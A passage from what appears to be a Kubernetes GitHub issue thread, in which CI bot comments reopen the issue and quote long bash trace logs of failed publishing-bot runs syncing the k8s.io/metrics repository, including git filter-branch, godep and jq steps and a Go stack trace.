index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=947a2ef33fedf754044c85476302be44e2c169fa\n>    \t++ git log --first-parent --format=%H --reverse 947a2ef33fedf754044c85476302be44e2c169fa..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch release-1.11.'\n>    \t+ git checkout -q release-1.11\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=b3132de4fe0fc20471297e9ba8902bac4132756e\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=b3132de4fe0fc20471297e9ba8902bac4132756e\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' b3132de4fe0fc20471297e9ba8902bac4132756e '!=' b3132de4fe0fc20471297e9ba8902bac4132756e ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=b3132de4fe0fc20471297e9ba8902bac4132756e\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/metrics\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ '[' -z 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ']'\n>    \t++ git-find-merge 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list '5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06..upstream-branch --ancestry-path\n>    \t+++ git rev-parse 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ local k_last_kube_merge=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ local dep_count=3\n>    \t+ (( i=0 ))\n>    \t+ (( i<3 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=release-1.11\n>    \t+ echo 'Looking up which commit in the release-1.11 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ../kube-commits-apimachinery-release-1.11\n>    \t+ '[' -z 103fd098999dc9c0c88536f5c9ad2e5da39373ae ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to 103fd098999dc9c0c88536f5c9ad2e5da39373ae'\n>    \t+ git checkout -q 103fd098999dc9c0c88536f5c9ad2e5da39373ae\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<3 ))\n>    \t+ local dep=api\n>    \t+ local branch=release-1.11\n>    \t+ echo 'Looking up which commit in the release-1.11 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ../kube-commits-api-release-1.11\n>    \t+ '[' -z 9e325467be0d83799fa9d630047839982ced21d0 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to 9e325467be0d83799fa9d630047839982ced21d0'\n>    \t+ git checkout -q 9e325467be0d83799fa9d630047839982ced21d0\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<3 ))\n>    \t+ local dep=client-go\n>    \t+ local branch=release-8.0\n>    \t+ echo 'Looking up which commit in the release-8.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ../kube-commits-client-go-release-8.0\n>    \t+ '[' -z e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a ']'\n>    \t+ pushd ../client-go\n>    \t+ echo 'Checking out k8s.io/client-go to e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a'\n>    \t+ git checkout -q e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<3 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' true = true ']'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' release-1.11 '!=' master ']'\n>    \t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>    \t+ rm -rf vendor/\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ true\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' release-1.11 '!=' master ']'\n>    \t+ '[' -d vendor/ ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code b3132de4fe0fc20471297e9ba8902bac4132756e\n>    \t+ echo 'Remove redundant godep commits on-top of b3132de4fe0fc20471297e9ba8902bac4132756e.'\n>    \t+ git reset --soft -q b3132de4fe0fc20471297e9ba8902bac4132756e\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/metrics\n>    \t+ local repo=metrics\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n '332ec57 Merge pull request #65283 from liggitt/automated-cherry-pick-of-#65256-upstream-release-1.11' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.11'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=release-1.11\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=b3132de4fe0fc20471297e9ba8902bac4132756e\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-metrics-release-1.11.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-metrics-release-1.11.sh\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-metrics-release-1.11.sh --dependencies apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 -alsologtostderr ''\n>    \tfatal: unable to access 'https://github.com/kubernetes/metrics/': Could not resolve host: github.com\n>    \tF0902 13:04:31.823847   20530 main.go:147] Failed to fetch tags for \"origin\": exit status 128\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc43d88b100, 0xc44d0c2d80, 0x5e, 0xb2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xa5fdc0, 0xc400000003, 0xc4200e8000, 0xa089d6, 0x7, 0x93, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xa5fdc0, 0x3, 0x81df10, 0x1f, 0xc4206e5cd8, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x81df10, 0x1f, 0xc4206e5cd8, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:147 +0xe7f\n>\n>[02 Sep 18 13:04 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-418821603):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>...6849f\n>\t+ GIT_COMMITTER_DATE='Thu, 28 Jun 2018 14:35:50 -0400'\n>\t+ git commit --allow-empty -q -C 7c894c7b821b5523dc755673d91ceeab0c56849f\n>\t+ '[' -z ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' 93096364ceb105d344866854d3ca817cea8b8b91 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t++ kube-commit Kubernetes-commit 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git show --format=%B -q 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ k_mainline_commit=287f6a564fb8c264f281056011f4a66f197b18f4\n>\t++ git-find-merge 287f6a564fb8c264f281056011f4a66f197b18f4 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 287f6a564fb8c264f281056011f4a66f197b18f4..upstream-branch --ancestry-path\n>\t+++ git rev-list '287f6a564fb8c264f281056011f4a66f197b18f4^1..upstream-branch' --first-parent\n>\t+++ git rev-parse 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t+ k_new_pending_merge_commit=4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ '[' 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c = 287f6a564fb8c264f281056011f4a66f197b18f4 ']'\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ is-merge-with-master 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t++ git show --format=short -q 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t+ return 1\n>\t+ '[' -n ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ']'\n>\t+ '[' 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c '!=' ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ is-merge-with-master ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t++ git show --format=short -q ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+ return 1\n>\t++ commit-subject ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t++ git show --format=%s -q ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\tCherry-picking source dropped-merge ed4a3fb9ed935a67ad62ffefb101b976b58013f9: Merge remote-tracking branch 'origin/master' into release-1.12.\n>\t+ echo 'Cherry-picking source dropped-merge ed4a3fb9ed935a67ad62ffefb101b976b58013f9: Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12.'\n>\t++ commit-date ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t++ git show --format=%aD -q ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+ local 'date=Tue, 28 Aug 2018 20:46:13 +0800'\n>\t+++ commit-message ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+++ git show --format=%B -q ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: ed4a3fb9ed935a67ad62ffefb101b976b58013f9'\n>\t++ GIT_COMMITTER_DATE='Tue, 28 Aug 2018 20:46:13 +0800'\n>\t++ GIT_AUTHOR_DATE='Tue, 28 Aug 2018 20:46:13 +0800'\n>\t++ git commit-tree -p 6f0bfbce375d23568e8611582a1ddbe7fbee658e -p HEAD -m 'Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12\n>\n>\n>\tKubernetes-commit: ed4a3fb9ed935a67ad62ffefb101b976b58013f9' 'HEAD^{tree}'\n>\t+ local dst_new_merge=36855396ea8fbfd0e0eea0e1c0a7b831993d7848\n>\t+ git reset -q --hard 36855396ea8fbfd0e0eea0e1c0a7b831993d7848\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=36855396ea8fbfd0e0eea0e1c0a7b831993d7848\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\tRunning godep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+ '[' -z ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ']'\n>\t++ git-find-merge ed4a3fb9ed935a67ad62ffefb101b976b58013f9 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'ed4a3fb9ed935a67ad62ffefb101b976b58013f9^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list ed4a3fb9ed935a67ad62ffefb101b976b58013f9..upstream-branch --ancestry-path\n>\t+++ git rev-parse ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+ local k_last_kube_merge=ed4a3fb9ed935a67ad62ffefb101b976b58013f9\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit ed4a3fb9ed935a67ad62ffefb101b976b58013f9.\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit ed4a3fb9ed935a67ad62ffefb101b976b58013f9.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 5b9368cdf77a46be5ad1f69d7df051414ce6c9cd ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to 5b9368cdf77a46be5ad1f69d7df051414ce6c9cd\n>\t+ echo 'Checking out k8s.io/apimachinery to 5b9368cdf77a46be5ad1f69d7df051414ce6c9cd'\n>\t+ git checkout -q 5b9368cdf77a46be5ad1f69d7df051414ce6c9cd\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit ed4a3fb9ed935a67ad62ffefb101b976b58013f9.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit ed4a3fb9ed935a67ad62ffefb101b976b58013f9.\n>\t+ read k_commit dep_commit\n>\t++ look -b ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ../kube-commits-api-release-1.12\n>\t+ '[' -z 2418e8b5b696996d4663bd977032eacea7a549eb ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to 2418e8b5b696996d4663bd977032eacea7a549eb\n>\t+ echo 'Checking out k8s.io/api to 2418e8b5b696996d4663bd977032eacea7a549eb'\n>\t+ git checkout -q 2418e8b5b696996d4663bd977032eacea7a549eb\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-9.0\n>\t+ echo 'Looking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit ed4a3fb9ed935a67ad62ffefb101b976b58013f9.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit ed4a3fb9ed935a67ad62ffefb101b976b58013f9.\n>\t++ look -b ed4a3fb9ed935a67ad62ffefb101b976b58013f9 ../kube-commits-client-go-release-9.0\n>\t+ '[' -z c4f8203f54326d45b62d23433d10551400652776 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to c4f8203f54326d45b62d23433d10551400652776'\n>\tChecking out k8s.io/client-go to c4f8203f54326d45b62d23433d10551400652776\n>\t+ git checkout -q c4f8203f54326d45b62d23433d10551400652776\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\tRunning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached 